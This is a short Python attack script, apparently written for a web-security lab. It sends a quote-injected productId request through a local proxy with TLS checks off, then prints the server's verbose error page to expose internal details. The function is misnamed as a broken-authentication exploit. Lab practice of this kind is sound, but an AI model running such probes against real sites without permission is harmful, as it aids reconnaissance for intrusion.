import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def broken_authentification_exploit(session, url) :
    exploit_url = url+"/product?productId=1'"
    r = session.get(exploit_url, verify=False, proxies=proxies)
    
    if "Internal Server Error" in r.text :
        print("The error message occur great!")
        print(r.text)
    else :
        print("Failed to exploit the error message!")

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    broken_authentification_exploit(session, url)